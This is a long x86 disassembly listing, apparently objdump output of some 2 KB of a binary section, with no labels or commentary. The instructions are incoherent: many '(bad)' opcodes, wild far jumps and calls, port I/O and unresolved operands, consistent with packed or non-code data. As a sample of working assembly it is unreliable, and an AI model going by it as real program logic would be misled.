  412fa2:	fsubr  DWORD PTR [eax+0x76f22114]
  412fa8:	mov    ds:0x7b490421,al
  412fad:	sub    DWORD PTR [edx],eax
  412faf:	lea    ebx,[ebp-0x1c7b286b]
  412fb5:	sub    DWORD PTR [esi],ecx
  412fb7:	jmp    0xd920d930
  412fbc:	adc    BYTE PTR [edx+0x38f931fc],bl
  412fc2:	jl     0x412f89
  412fc4:	addr16 jb 0x412fdb
  412fc7:	pushf  
  412fc8:	jb     0x412fab
  412fca:	pop    ss
  412fcb:	outs   dx,BYTE PTR ds:[esi]
  412fcc:	xor    BYTE PTR [edi+0x6d],0x37
  412fd0:	dec    edi
  412fd1:	retf   
  412fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fd3:	jmp    0x412fa6
  412fd5:	adc    bh,dl
  412fd7:	fimul  DWORD PTR [edi+0x9]
  412fda:	rcr    BYTE PTR [esi],cl
  412fdc:	pop    ecx
  412fdd:	fisub  WORD PTR [ebx]
  412fdf:	cmp    ecx,DWORD PTR [edi+ebp*2+0x58]
  412fe3:	jb     0x41302f
  412fe5:	inc    eax
  412fe6:	das    
  412fe7:	mov    gs,WORD PTR [esi+0x7a8256a1]
  412fed:	sub    eax,0xda48d463
  412ff2:	mov    DWORD PTR [edi+0x66793eab],ebx
  412ff8:	push   es
  412ff9:	(bad)  
  412ffa:	clc    
  412ffb:	fs mov eax,0xca4ce413
  413001:	lock outs dx,DWORD PTR ds:[esi]
  413003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413004:	and    eax,0xd4346219
  413009:	add    bl,BYTE PTR [edi+0x1b]
  41300c:	inc    edi
  41300d:	add    eax,0xa9be26d6
  413012:	loope  0x413047
  413014:	lahf   
  413015:	jg     0x41304d
  413017:	not    DWORD PTR [esi-0x22]
  41301a:	idiv   BYTE PTR [ebx-0x61cdfcb7]
  413020:	and    al,0x10
  413022:	mov    dh,0xe2
  413024:	inc    esi
  413025:	enter  0xc6b9,0x3b
  413029:	inc    ebp
  41302a:	mov    ebx,0x77d80608
  41302f:	jmp    0x413070
  413031:	(bad)  
  413032:	js     0x4130a0
  413034:	stos   DWORD PTR es:[edi],eax
  413035:	pushf  
  413036:	cmp    al,0x8c
  413038:	mov    ds:0x3eeae0f4,eax
  41303d:	pusha  
  41303e:	repnz sti 
  413040:	xor    DWORD PTR ds:0xbc564ca6,edx
  413046:	rcl    BYTE PTR [ebp-0x6a],cl
  413049:	fsubr  st,st(2)
  41304b:	int3   
  41304c:	mov    al,ds:0x93508db0
  413051:	mov    ebp,0x99131ae4
  413056:	inc    ecx
  413057:	(bad)  
  413058:	call   0x2bc75d66
  41305d:	inc    edx
  41305e:	dec    edx
  41305f:	adc    DWORD PTR [ebp+0x2b],eax
  413062:	or     eax,0xddf6eb09
  413067:	loop   0x412ff5
  413069:	mov    ebx,0xa51375f
  41306e:	ror    DWORD PTR [ebx+0x476afbf1],1
  413074:	add    al,0xa9
  413076:	mov    edx,0xb477b269
  41307b:	mov    DWORD PTR [ecx+0x7bcf2f98],ebx
  413081:	or     BYTE PTR [eax],al
  413083:	cs xor eax,0x60da95e7
  413089:	aaa    
  41308a:	imul   DWORD PTR [edx+0x28]
  41308d:	mov    esi,0x944f0f8a
  413092:	sahf   
  413093:	inc    ebp
  413094:	(bad)  
  413096:	in     eax,0xd2
  413098:	call   0xa7c906ee
  41309d:	pop    ebp
  41309e:	gs int 0x26
  4130a1:	xchg   edx,eax
  4130a2:	jg     0x413072
  4130a4:	pop    esp
  4130a5:	scas   eax,DWORD PTR es:[edi]
  4130a6:	cmc    
  4130a7:	sbb    BYTE PTR gs:[ecx+0xb15c49b],ch
  4130ae:	xor    ch,BYTE PTR [ecx+0x3d]
  4130b1:	xchg   edx,esp
  4130b3:	pop    esi
  4130b4:	jp     0x413101
  4130b6:	push   esp
  4130b7:	cs mov edi,0xfdeaeafe
  4130bd:	cmc    
  4130be:	add    cl,BYTE PTR [ebx-0x68c23b5d]
  4130c4:	jmp    0x41313a
  4130c6:	stos   BYTE PTR es:[edi],al
  4130c7:	(bad)  
  4130c9:	push   ds
  4130ca:	test   eax,0x137e6187
  4130cf:	test   BYTE PTR [ebp+0x66],ch
  4130d2:	jecxz  0x4130b1
  4130d4:	inc    ecx
  4130d5:	icebp  
  4130d6:	nop
  4130d7:	pop    eax
  4130d8:	xchg   edx,eax
  4130d9:	mov    cl,0xf
  4130db:	int    0x27
  4130dd:	lds    eax,FWORD PTR [ebx-0x52]
  4130e0:	je     0x413148
  4130e2:	mov    bl,0x95
  4130e4:	mov    ebx,DWORD PTR [esi+0x44]
  4130e7:	int3   
  4130e8:	adc    eax,0xf42a48d8
  4130ed:	and    eax,0x44ef8972
  4130f2:	pop    bp
  4130f4:	adc    ch,BYTE PTR [esi+0x1]
  4130f7:	mov    ah,0x3
  4130f9:	cs into 
  4130fb:	shl    BYTE PTR [edi-0x7843df28],0x7e
  413102:	out    0x19,al
  413104:	mov    ?,WORD PTR [eax+0x4171bd7b]
  41310a:	mov    bl,BYTE PTR [eax+ecx*4]
  41310d:	jg     0x4130c0
  41310f:	xchg   edx,eax
  413110:	loope  0x4130dd
  413112:	jo     0x4130c8
  413114:	sub    al,0x2b
  413116:	rcl    DWORD PTR [ebp+0x17],cl
  413119:	push   ecx
  41311a:	cmp    al,cl
  41311c:	add    BYTE PTR [ecx],bh
  41311e:	stos   BYTE PTR es:[edi],al
  41311f:	retf   0xf145
  413122:	cld    
  413123:	dec    ebx
  413124:	push   ebx
  413125:	mov    bh,BYTE PTR [esi+0x52]
  413128:	adc    bh,dh
  41312a:	(bad)  
  41312b:	jno    0x413153
  41312d:	mov    esi,0x14ede6c7
  413132:	pop    esi
  413133:	inc    ebx
  413134:	dec    esi
  413135:	rol    ch,0xa
  413138:	ret    0x869d
  41313b:	cmp    eax,0xac72f13a
  413140:	adc    al,0x5
  413142:	lods   al,BYTE PTR ds:[esi]
  413143:	cld    
  413144:	add    al,0x6
  413146:	test   BYTE PTR [edi+0x18],0x4
  41314a:	push   esi
  41314b:	jne    0x413120
  41314d:	mov    cl,BYTE PTR [esi-0x69]
  413150:	cmp    DWORD PTR [eax+0x44],ebx
  413153:	addr16 stc 
  413155:	lock xchg edi,eax
  413157:	lock mov edx,0xa9a09477
  41315d:	(bad)  
  41315e:	dec    esi
  41315f:	xchg   DWORD PTR [ebp+0x3502564e],esi
  413165:	push   ebp
  413166:	push   ds
  413167:	test   eax,0x3d81121c
  41316c:	or     eax,0xae7c6859
  413171:	mov    ebx,0x7cd1a01a
  413176:	adc    DWORD PTR ds:0x3b326291,ecx
  41317c:	call   0x1ed5:0x46455196
  413183:	mov    eax,?
  413185:	sbb    eax,0xb5311516
  41318a:	dec    ecx
  41318b:	push   edi
  41318c:	fld    st(3)
  41318e:	adc    ebp,DWORD PTR [ebp+0x454e5a3a]
  413194:	rcr    DWORD PTR [edi],1
  413196:	std    
  413197:	jmp    0xa9086d7c
  41319c:	fwait
  41319d:	dec    esp
  41319e:	mov    eax,0x6a1535e3
  4131a3:	and    ecx,esi
  4131a5:	xchg   esp,eax
  4131a6:	xchg   edx,eax
  4131a7:	add    ebp,DWORD PTR [ebp+0x9f8936d]
  4131ad:	or     BYTE PTR [esi],bl
  4131af:	icebp  
  4131b0:	repnz mov WORD PTR [ebx+0x4c449d7],?
  4131b7:	or     BYTE PTR [ebp-0x65f4eb5f],ah
  4131bd:	(bad)  
  4131be:	call   0x98fd:0xf135acd1
  4131c5:	aaa    
  4131c6:	sub    al,0x1a
  4131c8:	jp     0x4131de
  4131ca:	ret    0x95b
  4131cd:	ret    
  4131ce:	and    BYTE PTR [ebp+0x586d4823],dh
  4131d4:	jmp    0xd071:0x2112bfc
  4131db:	add    bl,BYTE PTR [ebp+0x67370be7]
  4131e1:	mov    ah,0x93
  4131e3:	push   ss
  4131e4:	(bad)  
  4131e5:	jmp    0x4131d8
  4131e7:	mov    eax,DWORD PTR [edx]
  4131e9:	pop    eax
  4131ea:	mov    al,ds:0xfa538c73
  4131ef:	icebp  
  4131f0:	mov    bl,0xf9
  4131f2:	mov    ebx,0x24e818a4
  4131f7:	ds sahf 
  4131f9:	pushf  
  4131fa:	dec    ebp
  4131fb:	sbb    esp,DWORD PTR [edx+0x10]
  4131fe:	call   FWORD PTR [esi]
  413200:	call   FWORD PTR [edi+0x56]
  413203:	and    BYTE PTR [edx+0x191a732c],dh
  413209:	(bad)  [ebx-0x7f83ab11]
  41320f:	imul   ebx,DWORD PTR cs:[esi+edx*2+0x62],0x7d
  413215:	push   edx
  413216:	and    dl,ah
  413218:	and    al,0x13
  41321a:	xor    dh,BYTE PTR [esp+ebx*8+0x5e2786a2]
  413221:	push   edi
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	(bad)  
  413224:	push   ss
  413225:	retf   
  413226:	xchg   ebx,eax
  413227:	jle    0x4131f0
  413229:	and    DWORD PTR [edx],ecx
  41322b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41322c:	adc    eax,0xd8c6d1dd
  413231:	add    al,0xb7
  413233:	mov    bh,0xda
  413235:	mov    bh,0x1a
  413237:	test   al,0x43
  413239:	or     eax,0x65ea3ef5
  41323e:	in     al,dx
  41323f:	cmp    DWORD PTR [ecx+0x2caff82d],eax
  413245:	pushf  
  413246:	xchg   esp,eax
  413247:	hlt    
  413248:	clc    
  413249:	jns    0x4131e4
  41324b:	fsub   DWORD PTR [ebx+eiz*2]
  41324e:	out    dx,al
  41324f:	inc    edi
  413250:	push   esi
  413251:	sub    ah,BYTE PTR [edx]
  413253:	jb     0x41329b
  413255:	das    
  413256:	in     al,dx
  413257:	jb     0x413293
  413259:	sub    esp,DWORD PTR [esi]
  41325b:	(bad)  
  41325d:	popa   
  41325e:	xchg   esi,eax
  41325f:	sub    al,0x24
  413261:	push   eax
  413262:	push   edx
  413263:	pushf  
  413264:	je     0x4132af
  413266:	mov    ecx,0xd06de830
  41326b:	fs xor al,bh
  41326e:	cmc    
  41326f:	nop
  413270:	aaa    
  413271:	xor    BYTE PTR [ecx],ah
  413273:	pop    esi
  413274:	fwait
  413275:	adc    eax,0x5e862cc6
  41327a:	push   0x8876fc67
  41327f:	xchg   edx,eax
  413280:	cmp    edi,esi
  413282:	inc    eax
  413283:	test   BYTE PTR [eax],bl
  413285:	or     BYTE PTR [ebx+0x13],ch
  413288:	mov    ah,0x76
  41328a:	jne    0x413220
  41328c:	jnp    0x413236
  41328e:	mov    edi,0xa8e0be5b
  413293:	xor    al,bl
  413295:	push   esi
  413296:	shl    BYTE PTR [edx+ebx*2+0x49],cl
  41329a:	imul   esi,DWORD PTR [ecx],0x3efea217
  4132a0:	cdq    
  4132a1:	pop    es
  4132a2:	retf   
  4132a3:	add    al,0x1d
  4132a5:	xor    eax,0xec2a9d64
  4132aa:	inc    ebp
  4132ab:	lds    ebp,FWORD PTR [edi]
  4132ad:	leave  
  4132ae:	iret   
  4132af:	push   ecx
  4132b0:	jb     0x4132e6
  4132b2:	popf   
  4132b3:	and    eax,0x43d95825
  4132b8:	jno    0x413273
  4132ba:	mul    BYTE PTR [esi+0x180d6e45]
  4132c0:	cdq    
  4132c1:	cmp    eax,0x1febe2a0
  4132c6:	inc    eax
  4132c7:	xchg   ebp,eax
  4132c8:	outs   dx,DWORD PTR ds:[esi]
  4132c9:	and    esi,DWORD PTR [edi+0x1]
  4132cc:	mov    al,0xc7
  4132ce:	or     BYTE PTR [ecx],0xac
  4132d1:	outs   dx,DWORD PTR ds:[esi]
  4132d2:	leave  
  4132d3:	imul   ecx,DWORD PTR [ebp-0x2503d218],0xbcc0b5a
  4132dd:	(bad)  
  4132de:	(bad)  
  4132df:	sbb    al,0xe
  4132e1:	leave  
  4132e2:	stos   DWORD PTR es:[edi],eax
  4132e3:	test   DWORD PTR [ecx+0x5],esi
  4132e6:	pop    ss
  4132e7:	cld    
  4132e8:	pop    es
  4132e9:	iret   
  4132ea:	mov    cl,0xc9
  4132ec:	aad    0x92
  4132ee:	int3   
  4132ef:	inc    ebx
  4132f0:	adc    al,0x41
  4132f2:	jl     0x413278
  4132f4:	cmp    eax,DWORD PTR [ebx-0x28]
  4132f7:	add    esp,eax
  4132f9:	mov    gs,WORD PTR [edx-0x7]
  4132fc:	sub    al,0xb4
  4132fe:	xchg   DWORD PTR [eax-0x155f2ef6],esi
  413304:	pop    esp
  413305:	pushf  
  413306:	pop    ds
  413307:	fisub  DWORD PTR [ebp+eiz*1+0x65]
  41330b:	sbb    ecx,DWORD PTR [edx-0x202ba5cb]
  413311:	popf   
  413312:	jmp    0x2741:0xa7366857
  413319:	in     eax,0xa7
  41331b:	shl    DWORD PTR [edx+0x2fdef42c],cl
  413321:	pusha  
  413322:	mov    ecx,0x98c14f71
  413327:	add    al,ch
  413329:	aas    
  41332a:	push   ds
  41332b:	fwait
  41332c:	pop    edx
  41332d:	mov    DWORD PTR [eax+0x8],esi
  413330:	adc    ch,bl
  413332:	push   ecx
  413333:	rcl    DWORD PTR [ebx+0x385a0a7],cl
  413339:	inc    ebx
  41333a:	dec    edi
  41333b:	push   esp
  41333c:	lahf   
  41333d:	ins    DWORD PTR es:[edi],dx
  41333e:	or     eax,0x9623d3b1
  413343:	fadd   st(7),st
  413345:	popa   
  413346:	mov    ah,0x20
  413348:	lods   al,BYTE PTR ds:[esi]
  413349:	mov    cs,WORD PTR [edi-0x342b622e]
  41334f:	call   0xd681b1f1
  413354:	or     eax,0x121865f0
  413359:	leave  
  41335a:	test   DWORD PTR [eax+0x3c22eb74],edx
  413360:	push   cs
  413361:	push   edx
  413362:	pop    edi
  413363:	fiadd  DWORD PTR [ecx-0x2b]
  413366:	or     al,0x96
  413368:	ins    BYTE PTR es:[edi],dx
  413369:	popa   
  41336a:	adc    ah,BYTE PTR ds:0x94ca3dfc
  413370:	lods   al,BYTE PTR ds:[esi]
  413371:	push   0xfffffff2
  413373:	test   BYTE PTR [edi],bl
  413375:	jbe    0x4133c8
  413377:	fimul  DWORD PTR [edx-0x7a]
  41337a:	ja     0x413381
  41337c:	js     0x4133e3
  41337e:	add    eax,0xcbad8310
  413383:	sub    dh,ch
  413385:	bound  eax,QWORD PTR [ecx-0x6b]
  413388:	cmp    BYTE PTR [edi-0x50],ch
  41338b:	loop   0x413330
  41338d:	jne    0x4133c0
  41338f:	xchg   esp,eax
  413390:	dec    edx
  413391:	ret    0x1dee
  413394:	cmp    BYTE PTR [edi-0x55f957ae],0x9a
  41339b:	enter  0x83c7,0xe6
  41339f:	ret    0xb480
  4133a2:	push   cs
  4133a3:	xor    edi,0xffffffcb
  4133a6:	loopne 0x4133c3
  4133a8:	(bad)  
  4133a9:	cli    
  4133aa:	add    esi,DWORD PTR [edi+ebp*4+0x28]
  4133ae:	daa    
  4133af:	lds    edi,FWORD PTR [edx]
  4133b1:	push   ecx
  4133b2:	mov    ebp,0xd6e5de43
  4133b7:	cdq    
  4133b8:	fidiv  DWORD PTR [ecx-0x92db383]
  4133be:	xchg   esi,eax
  4133bf:	cmc    
  4133c0:	loop   0x413414
  4133c2:	jbe    0x41337b
  4133c4:	pop    ecx
  4133c5:	xchg   BYTE PTR [edi],dh
  4133c7:	sbb    DWORD PTR [eax+0x3e],ebx
  4133ca:	mov    ds:0x9ae02d54,al
  4133cf:	inc    edx
  4133d0:	cli    
  4133d1:	into   
  4133d2:	cld    
  4133d3:	adc    BYTE PTR [ecx],dl
  4133d5:	loope  0x413419
  4133d7:	mov    eax,0xf1cf508d
  4133dc:	daa    
  4133dd:	leave  
  4133de:	test   al,0x4e
  4133e0:	loope  0x4133d6
  4133e2:	ret    0x95ce
  4133e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133e6:	jb     0x4133b5
  4133e8:	lahf   
  4133e9:	stc    
  4133ea:	push   edi
  4133eb:	ins    DWORD PTR es:[edi],dx
  4133ec:	(bad)  
  4133ed:	pop    edi
  4133ee:	ret    
  4133ef:	dec    edx
  4133f0:	pop    es
  4133f1:	(bad)  
  4133f2:	mov    ds:0xab32b932,al
  4133f7:	xchg   edi,eax
  4133f8:	mov    ecx,0x754e0a84
  4133fd:	aas    
  4133fe:	das    
  4133ff:	sbb    al,0xa4
  413401:	jb     0x4133df
  413403:	mov    ebp,esp
  413405:	or     BYTE PTR [edi],cl
  413407:	out    dx,eax
  413408:	jge    0x4133ae
  41340a:	mov    ds:0xef18756d,al
  41340f:	sti    
  413410:	scas   al,BYTE PTR es:[edi]
  413411:	fwait
  413412:	cwde   
  413413:	mov    edx,0x2eeafa8f
  413418:	inc    edx
  413419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41341a:	mov    cl,0xcf
  41341c:	in     al,dx
  41341d:	jns    0x41340f
  41341f:	xchg   esp,eax
  413420:	and    al,dl
  413422:	mov    bl,0x72
  413424:	xchg   ecx,eax
  413425:	inc    esp
  413426:	je     0x4133dd
  413428:	inc    edx
  413429:	test   eax,0xd696cecf
  41342e:	arpl   WORD PTR fs:[ebx+eiz*4-0xe6fda0e],sp
  413436:	jns    0x4133ed
  413438:	pop    esi
  413439:	sti    
  41343a:	jge    0x4133bd
  41343c:	sub    cl,BYTE PTR [eax+0x1a]
  41343f:	fistp  QWORD PTR [eax+eiz*1-0x36125661]
  413446:	adc    al,0xc1
  413448:	not    DWORD PTR [edx]
  41344a:	lock loopne 0x413447
  41344d:	lods   al,BYTE PTR ds:[esi]
  41344e:	ins    BYTE PTR es:[edi],dx
  41344f:	xor    ah,bl
  413451:	cli    
  413452:	mov    al,ds:0xfdccad7d
  413457:	cmp    esp,DWORD PTR [ebx+0x13]
  41345a:	jmp    0xba4a99f6
  41345f:	arpl   cx,ax
  413461:	adc    cl,ah
  413463:	test   al,0x84
  413465:	jmp    0x2dca2529
  41346a:	mov    DWORD PTR [ebp-0x1e8b761f],esp
  413470:	push   edi
  413471:	mov    dh,0x5b
  413473:	outs   dx,DWORD PTR ds:[esi]
  413474:	dec    eax
  413475:	sbb    al,0xee
  413477:	xchg   ebx,eax
  413478:	jle    0x413490
  41347a:	cs ret 0x94de
  41347e:	aad    0x8a
  413480:	xchg   ecx,eax
  413481:	aaa    
  413482:	pop    ds
  413483:	shl    BYTE PTR [esi],cl
  413485:	inc    ebp
  413486:	out    dx,eax
  413487:	test   eax,0x6507099c
  41348c:	test   eax,0x9bb7b31f
  413491:	xchg   BYTE PTR [ebp+0x44519ca0],ah
  413497:	and    ebp,0x15
  41349a:	or     edi,DWORD PTR [ecx-0x58c00833]
  4134a0:	sar    bh,cl
  4134a2:	es inc edi
  4134a4:	mov    esp,0x4612ff
  4134a9:	jp     0x41350e
  4134ab:	pop    ebp
  4134ac:	pop    eax
  4134ad:	mov    edi,0xea4be1c0
  4134b2:	pop    es
  4134b3:	mov    ch,0xba
  4134b5:	push   ss
  4134b6:	or     BYTE PTR [eax+0x506bdc9d],cl
  4134bc:	mov    ah,0xca
  4134be:	hlt    
  4134bf:	call   0x790c:0x7dc194f3
  4134c6:	mov    bl,0x91
  4134c8:	pushf  
  4134c9:	jp     0x413548
  4134cb:	call   0x5828db46
  4134d0:	add    DWORD PTR [esi+0x37146edf],edx
  4134d6:	outs   dx,BYTE PTR ds:[esi]
  4134d7:	ins    DWORD PTR es:[edi],dx
  4134d8:	pop    ecx
  4134da:	mov    bh,0xb7
  4134dc:	or     al,0xf1
  4134de:	fldcw  WORD PTR [esp+ebp*1-0x12ae3b82]
  4134e5:	in     eax,dx
  4134e6:	in     eax,dx
  4134e7:	mov    BYTE PTR [ebp-0xf],ah
  4134ea:	mov    bl,0x80
  4134ec:	cmp    esi,DWORD PTR [eax]
  4134ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ef:	or     eax,0x71bd78b3
  4134f4:	into   
  4134f5:	(bad)  
  4134f6:	push   ss
  4134f7:	adc    DWORD PTR [ebx],esp
  4134f9:	mov    DWORD PTR [esi-0x365b91ab],ebx
  4134ff:	(bad)  
  413501:	ret    0xc327
  413504:	in     eax,dx
  413505:	dec    ecx
  413506:	ja     0x413563
  413508:	mov    bl,0x6b
  41350a:	add    dh,BYTE PTR [ecx-0x29]
  41350d:	fdivr  st(4),st
  41350f:	scas   al,BYTE PTR es:[edi]
  413510:	xchg   ebp,eax
  413511:	mov    ds:0x13e7a8e2,al
  413516:	pop    esp
  413517:	push   ss
  413518:	and    eax,DWORD PTR [eax-0xe]
  41351b:	xchg   edx,eax
  41351c:	add    al,0x63
  41351e:	ret    0x3a4
  413521:	jae    0x413509
  413523:	mov    BYTE PTR [esi+0x44],dl
  413526:	xor    BYTE PTR ds:0xd8646d02,dh
  41352c:	cmp    al,0xe9
  41352e:	fisub  WORD PTR [ebp+edx*2+0x555ebb29]
  413535:	test   eax,0xae940038
  41353a:	loop   0x41357e
  41353c:	add    eax,eax
  41353e:	cwde   
  41353f:	std    
  413540:	fistp  WORD PTR [ecx+0x60]
  413543:	loopne 0x4134e1
  413545:	jmp    0x4135aa
  413547:	push   ds
  413548:	and    al,0xc8
  41354a:	mov    dl,0xcf
  41354c:	pusha  
  41354d:	xchg   BYTE PTR [ebp+0x53],ah
  413550:	jmp    0x4134d5
  413552:	int    0x6e
  413554:	push   0x3a
  413556:	push   ecx
  413557:	(bad)  
  413558:	into   
  413559:	xchg   DWORD PTR [ecx+0x7e3c0cca],esi
  41355f:	mov    dl,0xcf
  413561:	cmc    
  413562:	mov    ah,0x7f
  413564:	add    ebp,DWORD PTR [edi-0x7ff6bcee]
  41356a:	cmp    al,BYTE PTR [edi+eax*4-0x5c]
  41356e:	mov    ah,0xbb
  413570:	mov    ah,0x34
  413572:	mov    edi,0x5c78df49
  413577:	stc    
  413578:	xchg   ecx,eax
  413579:	sti    
  41357a:	mov    ah,0x58
  41357c:	in     al,dx
  41357d:	fidiv  DWORD PTR [ebx]
  41357f:	push   0xffffff88
  413581:	inc    eax
  413582:	push   esp
  413583:	or     DWORD PTR [ecx+0x1f],esp
  413586:	jle    0x413584
  413588:	mov    eax,ds:0xb9bce709
  41358e:	sub    bh,BYTE PTR [ecx+eiz*2+0x41a7cb19]
  413595:	and    eax,0xd82e26ea
  41359a:	jae    0x41354f
  41359c:	rol    ah,cl
  41359e:	jbe    0x413574
  4135a0:	rcr    BYTE PTR [esi+0x69],0x1f
  4135a4:	xchg   edx,eax
  4135a5:	cvttps2pi mm4,xmm3
  4135a8:	inc    esp
  4135a9:	(bad)  
  4135aa:	leave  
  4135ab:	mov    bh,0x1b
  4135ad:	dec    ebp
  4135ae:	mov    esp,0x1f84aab
  4135b3:	js     0x413621
  4135b5:	int    0x65
  4135b7:	push   esp
  4135b8:	mov    ebp,0xc9e2df8f
  4135bd:	dec    DWORD PTR [edi-0x5f]
  4135c0:	mov    cl,0x50
  4135c2:	icebp  
  4135c3:	jnp    0x41361c
  4135c5:	cmp    BYTE PTR [ebx],bh
  4135c7:	sub    ch,dh
  4135c9:	push   eax
  4135ca:	xchg   ecx,eax
  4135cb:	dec    ebp
  4135cc:	cmp    DWORD PTR [edx],edx
  4135ce:	jb     0x4135a8
  4135d0:	pop    edx
  4135d1:	loop   0x41357b
  4135d3:	push   ds
  4135d4:	mov    eax,ds:0xb0c3541b
  4135d9:	popa   
  4135da:	inc    ebp
  4135db:	cmp    al,0xdb
  4135dd:	les    ebx,FWORD PTR [eax-0x7cc551aa]
  4135e3:	add    bh,BYTE PTR [eax]
  4135e5:	fwait
  4135e6:	mov    edx,0xbbd02144
  4135eb:	inc    esi
  4135ec:	hlt    
  4135ed:	gs js  0x413589
  4135f0:	jp     0x41363e
  4135f2:	push   0x26
  4135f4:	xor    DWORD PTR [edi],eax
  4135f6:	test   eax,0x86534caf
  4135fb:	cli    
  4135fc:	into   
  4135fd:	sbb    BYTE PTR [esi+edx*1+0x44],ah
  413601:	xor    al,0x70
  413603:	xchg   ebp,eax
  413604:	xor    dh,BYTE PTR [ebx-0xc4d48b1]
  41360a:	mov    dh,0x4a
  41360c:	push   ds
  41360d:	std    
  41360e:	shl    DWORD PTR [ecx-0x5222f79e],1
  413614:	mov    esi,0x5542e991
  413619:	mov    al,ds:0xf505d8b5
  41361e:	sub    BYTE PTR [ebp-0x4f],0x22
  413622:	scas   eax,DWORD PTR es:[edi]
  413623:	stos   DWORD PTR es:[edi],eax
  413624:	sti    
  413625:	push   es
  413626:	fs scas al,BYTE PTR es:[edi]
  413628:	js     0x41368c
  41362a:	ds ins BYTE PTR es:[edi],dx
  41362c:	retf   0xbbea
  41362f:	je     0x41363a
  413631:	or     eax,0x53cb69d2
  413636:	les    ebx,FWORD PTR [edi]
  413638:	cli    
  413639:	mov    al,0xed
  41363b:	popa   
  41363c:	out    0xa0,eax
  41363e:	(bad)  
  41363f:	cmp    BYTE PTR [eax+0x5f8c2d57],dl
  413645:	mov    edx,0x89580f06
  41364a:	bound  esp,QWORD PTR [ebp-0x1899dad0]
  413650:	cld    
  413651:	imul   ebp,esi,0xaf510522
  413657:	xchg   esi,eax
  413658:	repz mov ds:0xb1440223,eax
  41365e:	out    0xeb,eax
  413660:	xchg   DWORD PTR [edi+0x152b3ad0],edi
  413666:	sahf   
  413667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413668:	push   es
  413669:	add    eax,ecx
  41366b:	jo     0x413609
  41366d:	rol    BYTE PTR [ebp+0x1b],cl
  413670:	bound  ecx,QWORD PTR [esi+0x5197a414]
  413676:	test   BYTE PTR [ecx],0xd6
  413679:	lds    ecx,FWORD PTR [edi+ecx*2+0x3f]
  41367d:	inc    ecx
  41367e:	in     al,0x2c
  413680:	je     0x41368e
  413682:	loope  0x413609
  413684:	not    DWORD PTR [edi]
  413686:	sar    BYTE PTR [eax],1
  413688:	inc    esi
  413689:	xor    bh,BYTE PTR [esi-0x77efca6]
  41368f:	ficomp DWORD PTR [ecx-0x6f796c61]
  413695:	or     DWORD PTR [edi],edi
  413697:	repz das 
  413699:	push   esp
  41369a:	or     BYTE PTR [edx+0x51],0x7a
  41369e:	adc    eax,DWORD PTR [eax-0x72]
  4136a1:	sub    ebp,eax
  4136a3:	gs pop ss
  4136a5:	out    0x8,eax
  4136a7:	jnp    0x413712
  4136a9:	adc    DWORD PTR [eax],ecx
  4136ab:	push   cs
  4136ac:	fiadd  DWORD PTR [eax]
  4136ae:	sub    al,0x94
  4136b0:	and    dl,BYTE PTR ds:0x849b2b69
  4136b6:	clc    
  4136b7:	mov    esi,DWORD PTR [esi+edi*8+0x37712b7]
  4136be:	mov    BYTE PTR ds:0xcdd4dc5,dh
  4136c4:	add    al,0xb5
  4136c6:	sub    al,0xaf
  4136c8:	mov    dl,0x62
  4136ca:	ins    DWORD PTR es:[edi],dx
  4136cb:	in     al,0x16
  4136cd:	hlt    
  4136ce:	repz cmp DWORD PTR [ebp+0x7],ebp
  4136d2:	dec    ecx
  4136d3:	ror    DWORD PTR [edi-0x17a64d9e],cl
  4136d9:	xchg   ebp,eax
  4136da:	xor    edi,DWORD PTR [esi]
  4136dc:	and    eax,0x89b3226d
  4136e1:	ins    DWORD PTR es:[edi],dx
  4136e2:	inc    edi
  4136e3:	mov    ds:0x4cc53794,al
  4136e8:	out    dx,al
  4136e9:	popf   
  4136ea:	adc    al,0x2d
  4136ec:	jno    0x41366f
  4136ee:	std    
  4136ef:	stos   WORD PTR es:[edi],ax
  4136f1:	je     0x4136bb
  4136f3:	mov    eax,ds:0x986d39bf
  4136f8:	jp     0x4136f1
  4136fa:	jge    0x4136bb
  4136fc:	and    ebp,DWORD PTR [ebp-0x6c]
  4136ff:	push   es
  413700:	(bad)  
  413701:	mov    edi,DWORD PTR [eax+edx*2+0x5c8f72ca]
  413708:	(bad)  
  413709:	xchg   esp,eax
  41370a:	fwait
  41370b:	pop    ss
  41370c:	sub    cl,BYTE PTR [ecx*2-0x5dfab9b0]
  413713:	adc    eax,0x17f350eb
  413718:	push   edi
  413719:	inc    ebx
  41371a:	rol    BYTE PTR [ecx+0x76c8a6e9],1
  413720:	fst    QWORD PTR [edx+0x52ea70b0]
  413726:	(bad)  
  413727:	sbb    DWORD PTR [esi+ebp*8],esi
  41372a:	sbb    DWORD PTR [edx-0x71],edx
  41372d:	cmp    ch,ch
  41372f:	push   esp
  413730:	mov    ah,0x1c
  413732:	in     eax,0xf9
  413734:	iret   
  413735:	adc    DWORD PTR [edi+0x47],0xfffffffd
  413739:	dec    eax
  41373a:	mov    al,ds:0x87c24fbd
  41373f:	neg    DWORD PTR [eax+0x62]
  413742:	fmul   QWORD PTR [edx+0x6b44fdc3]
  413748:	pop    eax
  413749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41374a:	out    dx,eax
  41374b:	jle    0x413736
  41374d:	mov    cl,0x7d
  41374f:	daa    
  413750:	xchg   edx,eax
  413751:	pop    eax
  413752:	fldlg2 
  413754:	inc    ebx
  413755:	mov    esi,0x47a7ec0c
  41375a:	lds    edi,FWORD PTR [edx+0x29d6e1cd]
  413760:	fdiv   st,st(2)
  413762:	adc    al,0xf9
  413764:	lock xchg edx,eax
  413766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413767:	dec    esi
  413768:	dec    eax
  413769:	lods   al,BYTE PTR ds:[esi]
  41376a:	add    esi,DWORD PTR [esi+0x362967c9]
  413770:	pop    ds
  413771:	jbe    0x413761
  413773:	or     eax,0xd72eab29
  413778:	outs   dx,BYTE PTR ds:[esi]
  413779:	inc    DWORD PTR [ecx]
  41377b:	mov    ebx,0x241de2d9
  413780:	jbe    0x4137b2
  413782:	addr16 in eax,0x68
  413785:	gs out 0x86,eax
  413788:	enter  0x96b6,0x36
  41378c:	out    0x90,eax
  41378e:	outs   dx,DWORD PTR ds:[esi]
